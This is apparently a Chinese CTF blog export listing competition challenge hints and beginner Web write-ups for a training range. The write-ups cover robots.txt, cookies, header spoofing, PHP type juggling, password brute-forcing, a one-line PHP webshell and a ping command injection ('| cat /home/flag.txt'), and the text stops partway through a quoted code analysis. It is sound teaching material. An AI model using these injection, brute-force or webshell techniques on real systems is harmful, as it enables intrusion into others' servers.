<h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><h2 id="filecheacker-pro"><a href="#filecheacker-pro" class="headerlink" title="filecheacker_pro"></a>filecheacker_pro</h2><h2 id="filecheacker-pro-max"><a href="#filecheacker-pro-max" class="headerlink" title="filecheacker_pro_max"></a>filecheacker_pro_max</h2><h1 id="强网拟态"><a href="#强网拟态" class="headerlink" title="强网拟态"></a>强网拟态</h1><h2 id="天地一体化移动高安全专网系统"><a href="#天地一体化移动高安全专网系统" class="headerlink" title="天地一体化移动高安全专网系统"></a>天地一体化移动高安全专网系统</h2><blockquote>
<p>题目描述:</p>
<p>阶段一:选手利用VPN客户端可以登入内网服务器Server1,该内网服务器被安全团队指出拥有某种漏洞，但是该内网管理员仍未采取任何安全措施。Server1 与内网服务器Server2定时通信(通信程序名为Heartbeat) ，通信时使用取在Heartbeat程序执行目录下的file.txt文件，提交该文件的前8个字符即视为解题成功。flag格式是fag{xxx}件，然后将配置文件(goConfigs_ _{TEAMID}.json)复制到HS-VPN客户端的解压目录，并重命名为机号(13012345678) 和邀请码(mimic) 注机号(13012345678) 和邀请码(mimic) 注册VPN账号。待VPN启动后访问</p>
</blockquote>
<h1 id="idesk2022"><a href="#idesk2022" class="headerlink" title="idesk2022"></a>idesk2022</h1><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><blockquote>
<p>hint:Just read the flag!</p>
<p>看看旗帜!</p>
</blockquote>
<h2 id="SimpleFileServer"><a href="#SimpleFileServer" class="headerlink" title="SimpleFileServer"></a>SimpleFileServer</h2><blockquote>
<p>hint:All I wanted was a website letting me host files anonymously for free, for ever</p>
<p>我想要的只是一个网站，让我可以永远匿名地保存文件</p>
</blockquote>
<h2 id="Paywall"><a href="#Paywall" class="headerlink" title="Paywall"></a>Paywall</h2><blockquote>
<p>hint:Check out this local news paper I built using PHP! You’ll need to pay in order to view the good stuff though :)</p>
<p>看看我用PHP构建的本地报纸吧!不过，你需要付费才能看到好东西:)</p>
</blockquote>
<h2 id="JSON-Beautifier"><a href="#JSON-Beautifier" class="headerlink" title="JSON Beautifier"></a>JSON Beautifier</h2><blockquote>
<p>hint:Turn your weak, ugly JSON into a thing of beauty using my revolutionary new tool! note: the flag is stored in the admin’s cookie</p>
<p>使用我的革命性的新工具，把你的弱，丑陋的JSON变成一个美丽的东西!注意:该标志存储在管理员的cookie中</p>
</blockquote>
<h2 id="badblocker"><a href="#badblocker" class="headerlink" title="badblocker"></a>badblocker</h2><blockquote>
<p>hint:Stay one step ahead of ads with 🅱️ad🅱️locker™, the net’s one-and-only recursive adblocker!</p>
<p>保持一步领先的广告🅱️广告🅱️储物柜™，网络的一个和唯一的递归广告拦截器!</p>
</blockquote>
<h2 id="task-manager"><a href="#task-manager" class="headerlink" title="task manager"></a>task manager</h2><blockquote>
<p>hint:Are you constantly procrastinating real work by spending too much time on ctfs? Me too! That’s why I created this lit af task manager app to help us stay on top of our duties.</p>
<p>你是否经常因为在ctfs上花费太多时间而拖延真正的工作?我也是!这就是为什么我创建了这个任务管理器应用程序来帮助我们保持我们的职责。</p>
</blockquote>
<h2 id="Proxy-Viewer"><a href="#Proxy-Viewer" class="headerlink" title="Proxy Viewer"></a>Proxy Viewer</h2><blockquote>
<p>hint:check out my epic proxy service for viewing websites! however, you’ll need to pay me in cash if you want to be a premium member</p>
<p>NOTE: there is significant rate limiting in place to keep the challenge healthy. please deploy, test, and solve locally before attempting to solve on the remote instance</p>
<p>看看我的史诗代理服务查看网站!但是，如果你想成为高级会员，你需要支付现金</p>
<p>注意:有显著的速率限制，以保持挑战的健康。在尝试在远程实例上求解之前，请在本地部署、测试和求解</p>
</blockquote>
<h2 id="Stargazer"><a href="#Stargazer" class="headerlink" title="Stargazer"></a>Stargazer</h2><blockquote>
<p>hint:I am creating this challenge while gazing the stars. Hoping there’s no bug when developing the chall</p>
<p>我在凝视星空的时候创造了这个挑战。希望在开发chall时没有bug</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界靶场wp</title>
    <url>/2022/06/21/Gongfang-wp/</url>
    <content><![CDATA[<p><code>这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下</code></p>
<p><code>...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方便看看有哪些适合难度的题目做一做</code></p>
<span id="more"></span>

<h1 id="Web新手"><a href="#Web新手" class="headerlink" title="Web新手"></a>Web新手</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>右键不管用，直接用F12查看</p>
<p>得到flag</p>
<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师上课讲了<code>Robots</code>协议，小宁同学却上课打了瞌睡，赶紧来教教小宁<code>Robots</code>协议是什么吧</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>不清楚<code>robots</code>协议是什么，于是我百度了一下，</p>
<p><code>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取</code></p>
<p>也就是说网站下有一个robots.txt文件，规定了页面抓取规则，于是我们尝试访问<code>http://111.200.241.244:54251/robots.txt</code></p>
<p>界面显示如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621223828917.png" alt="image-20220621223828917"></p>
<p>disallow就是不允许抓取的页面，看到flag，就知道我们就要访问这个文件，于是访问<code>http://111.200.241.244:54251/f1ag_1s_h3re.php</code></p>
<p>得到flag</p>
<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>看到找文件，首先我就想用dirsearch扫一扫</p>
<p>打开靶场先看到</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621224315003.png" alt="image-20220621224315003"></p>
<p>于是我先扫一扫，看一看有没有 index.php文件的文件名</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621224424076.png" alt="image-20220621224424076"></p>
<p>扫完后发现index.php.bak文件，很明显它就是备份文件，我们尝试直接访问它一下<code>http://111.200.241.244:52824/index.php.bak</code></p>
<p>自动下载好了index.php.bak，用文本打开</p>
<p>得到flag</p>
<h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：这是夹心饼干的意思吗？</p>
<h3 id="2）wp"><a href="#2）wp" class="headerlink" title="2）wp"></a>2）wp</h3><p>我的日常随记第一章大概讲了cookie的作用和含义，该题可以不了解也可以完成</p>
<p>目前我看cookie的有两个方法，一个是burpsuite抓包看，另一个就是用火狐插件Tamper Data，这里我用brup</p>
<p>我们先用burpsuite抓一个包看看</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621225826671.png" alt="image-20220621225826671"></p>
<p>发现cookie处提示有个cookie.php文件，访问<code>http://111.200.241.244:49599/cookie.php</code>看看，如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621225920306.png" alt="image-20220621225920306"></p>
<p>于是我们把抓包数据发到repeater里看看response</p>
<p>得到flag</p>
<h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>该题说按这个按钮不能按，那么为什么不能按，看看源码</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621230709669.png" alt="image-20220621230709669"></p>
<p>看到有个disabled，就是它使得按钮无法被按，所以删去就可以</p>
<p>打开开发者工具，在查看器里面，把disabled语句删去</p>
<p>按钮就可以按了，点击</p>
<p>得到flag</p>
<h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><h3 id="1-题目描述-5"><a href="#1-题目描述-5" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始我们先随便输入用户名和密码，弹窗显示</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220623115614924.png" alt="image-20220623115614924"></p>
<p>于是我们知道用户名是  admin，但是密码不知道，只知道是随手输入的，我们试试burp抓包看看有没有提示</p>
<p>在response里看到</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220623115811366.png" alt="image-20220623115811366"></p>
<p>这里我们就知道要用burp的密码爆破，具体操作就不细讲，随记有写</p>
<p>这是部分密码txt的网站，可以下载使用，针对不同环境，用不同密码文本</p>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
<p>最后爆出密码123456,以用户 admin输入登录</p>
<p>得到flag</p>
<h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><h3 id="1-题目描述-6"><a href="#1-题目描述-6" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>先进行代码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;   <span class="keyword">echo</span> <span class="variable">$flag1</span>; </span><br><span class="line">&#125; <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(); &#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;   </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag2</span>; &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到flag被分成了两个部分，一个flag1，一个 flag2</p>
<p>a,b两个变量以get型输入</p>
<p>第一个if要求a&#x3D;&#x3D;0且a为ture，这明显矛盾，当a&#x3D;0就代表a为false</p>
<p>所以这里涉及了php性质，php属于一门弱类型语言</p>
<p><code>弱类型：不必向 PHP 声明该变量的数据类型，PHP 会根据变量的值，自动把变量转换为正确的数据类型</code></p>
<p>所以当在第一个if判断a的值时，a可以利用弱类型性质，a&#x3D;0A，当进行a&#x3D;&#x3D;0判断时，会自动把a当作数字型，也就是把a&#x3D;0A后的A去掉，从而成立；</p>
<p>而当判断a是否为ture时，由于a&#x3D;0A而非0，所以结果为ture，输出flag1</p>
<p><em>这里思考一下，如果是 <code>if( $a===0 and $a )&#123; echo $flag1; &#125;</code>，那按上面对a赋值还可以吗？</em></p>
<p><em>这里涉及php类型比较&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;的区别</em></p>
<ul>
<li><em>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</em></li>
<li><em>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</em></li>
</ul>
<p><em>上面代码中&#x3D;&#x3D;对类型不比较，所以a&#x3D;0A与0比较时，可当作a&#x3D;0与0比较</em></p>
<p><em>但是当为&#x3D;&#x3D;&#x3D;时，a&#x3D;0A不属于数字型，所以当if(a&#x3D;&#x3D;&#x3D;0)返回false，从而返回false</em></p>
<p>第二个if看到，is_numeric($b)，这里要了解一下is_numereic()函数的作用</p>
<p><code>is_numeric()函数：用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE</code></p>
<p>也就是说b的值不能为数字和数字串，但是第三个if要求b&gt;1234，所以b要为数字</p>
<p>这个和a一样，利用了php的弱类型性质，既然不能为数字，那b&#x3D;1235B，这样当b与1234比较时，b转化为数字型，去掉B，1235&gt;1234成立，输出flag2</p>
<p>于是payload为</p>
<p><code>http://111.200.241.244:51156/?a=0A&amp;b=1235B</code></p>
<p>得到flag</p>
<h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><h3 id="1-题目描述-7"><a href="#1-题目描述-7" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p>
<h3 id="2）wp-1"><a href="#2）wp-1" class="headerlink" title="2）wp"></a>2）wp</h3><p>Get和Post方式是HTTP通常使用两种请求方法</p>
<p>Get方式直接在url输入?a&#x3D;1</p>
<p><code>http://111.200.241.244:52081/?a=1</code></p>
<p>Post方式利用火狐插件HackerBar以post方式b&#x3D;2</p>
<p>run</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624164728734.png" alt="image-20220624164728734"></p>
<p>得到flag</p>
<h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><h3 id="1-题目描述-8"><a href="#1-题目描述-8" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁其实xff和referer是可以伪造的</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>先了解什么是xxf和referer</p>
<p><code>（1）X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</code></p>
<p><code>（2）HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer  是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</code></p>
<p>抓包后，发现并没有X-Forwarded-For和Referer，加上即可</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624173529705.png" alt="image-20220624173529705"></p>
<p>看题界面，提示ip必须为123.123.123.123，于是在抓包数据里加上</p>
<p><code>X-Forwarded-For： 123.123.123.123</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624174546646.png" alt="image-20220624174546646"></p>
<p>send数据后，发现response里出现以下数据，也就是说还有声明是从谷歌界面过来的</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624173805175.png" alt="image-20220624173805175"></p>
<p>也就是还要加上</p>
<p><code>Referer:  https://www.google.com</code></p>
<p>最后如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624174117936.png" alt="image-20220624174117936"></p>
<p>send到response后</p>
<p>得到 flag</p>
<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><h3 id="1-题目描述-9"><a href="#1-题目描述-9" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>看到这句代码我一下想到一句话木马，标题<a href="../../../../2022/06/21/Qusetion/">webshell</a>也提示这个木马题，根据描述我们知道这个木马在index.php里</p>
<p>不了解的可以看看这篇文章</p>
<p><a href="https://www.jianshu.com/p/6b815f951db3">php一句话木马</a></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624210259387.png" alt="image-20220624210259387"></p>
<p>用蚁剑连接即可，这里对蚁剑使用方法不赘述，建议自己操作学习</p>
<p>得到flag</p>
<h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><h3 id="1-题目描述-10"><a href="#1-题目描述-10" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>根据题目名知道这是命令执行漏洞的题，可以先了解一下<a href="../../../../2022/05/28/Web-study">命令执行</a>的知识</p>
<p>先用自己的IP试一下</p>
<p><code>120.0.0.1</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624213448262.png" alt="image-20220624213448262"></p>
<p>得到以下数据，由此可知我们上传的命令是<code>ping -c 3 + 输入的语句</code>，所以需要用到管道符</p>
<p>此处不止可以用 |，了解了其他管道符的作用，也可以达到相同的效果</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624215127339.png" alt="image-20220624215127339"></p>
<p>在利用管道符，在当前目录及其子目录查找有没有名为flag.txt的文件</p>
<p><code>120.0.0.1 | find  / -name flag.txt</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624215415187.png" alt="image-20220624215415187"></p>
<p>得到flag.txt的位置的绝对路径</p>
<p>输出打印flag,txt</p>
<p><code>120.0.0.1 | cat /home/flag.txt</code></p>
<p>得到flag</p>
<h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><h3 id="1）题目描述"><a href="#1）题目描述" class="headerlink" title="1）题目描述"></a>1）题目描述</h3><p>小宁发现了一个网页，但却一直输不对密码。</p>
<p>(Flag格式为 Cyberpeace{xxxxxxxxx} )</p>
<h3 id="2）wp-2"><a href="#2）wp-2" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题涉及代码审计，看起有点难度，但说实话大部分内容与代码审计无关，但可以分析一下</p>
<p>开始界面弹窗输入密码</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624221241740.png" alt="image-20220624221241740"></p>
<p>输入错误，提示FAUX PASSWORD HAHA</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624221310762.png" alt="image-20220624221310762"></p>
<p>我们F12把它源码拿出来分析一下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        j = tab.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        k = j + (l) + (n=<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">        n = tab2.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">    &#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">               &#123;</span></span><br><span class="line"><span class="language-javascript">                   o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">                   <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">                   p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span><br><span class="line"><span class="language-javascript">        pass = p;<span class="keyword">return</span> pass;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们看到开头一大串代码先不着急，挨个分析</p>
<p>最显眼的就是这串16进制码</p>
<p><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p>
<p>我们可以先用python 直接输出，得到10进制</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624223640446.png" alt="image-20220624223640446"></p>
<p>这里我们把这串10进制数按ascii码转化为字符串</p>
<p>786OsErtk12</p>
<p>按描述填写 </p>
<p>得到flag : Cyberpeace{786OsErtk12}</p>
<hr>
<p>我对代码审计还不太熟悉，下面引用一篇大佬的代码审计</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">执行流程：</span><br><span class="line">一、首先定义了一个<span class="variable">dechiffre</span>函数，咱先不管，因为还没有调用</span><br><span class="line">注：先将\<span class="variable">x35</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x37</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x36</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x30</span>\<span class="variable">x37</span>\<span class="variable">x2c</span>\<span class="variable">x34</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x30</span>十六进制数转换成字符串，<span class="variable">python</span>下<span class="variable">print</span>即可，或网址：<span class="variable">https</span>:<span class="comment">//www.bejson.com/convert/ox2str/</span></span><br><span class="line">输出结果<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">二、执行<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line"></span><br><span class="line">三、调用了<span class="variable">dechiffre</span>，执行<span class="variable">dechiffre</span>函数</span><br><span class="line"><span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line">(<span class="number">1</span>)先将<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>带入<span class="variable">dechiffre</span>函数执行，即<span class="title function_">dechiffre</span>(<span class="variable">pass_enc</span>)<span class="operator">=</span><span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)接着我们看到了<span class="variable">pass</span>变量，暂时先放着</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)因为<span class="variable">pass_enc</span><span class="operator">=</span><span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50&quot;</span></span><br><span class="line">将<span class="variable">pass_enc</span>字符串分割成字符串数组，赋值给<span class="variable">tab</span>参数，所以：</span><br><span class="line"><span class="variable">tab</span><span class="operator">=</span>[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]   注：<span class="variable">tab</span>此时是字符串数组！！！</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)随后也对<span class="variable">pass</span>分割</span><br><span class="line"><span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)变量赋值代码分析：<span class="keyword">var</span> <span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,<span class="variable">p</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="variable">j</span> <span class="operator">=</span> <span class="variable">tab</span>.<span class="property">length</span>;</span><br><span class="line">一开始<span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,没有赋值，为<span class="variable">undefined</span>，其它参数<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>，<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span>，后来<span class="variable">i</span>被赋值<span class="operator">=</span><span class="number">0</span>，<span 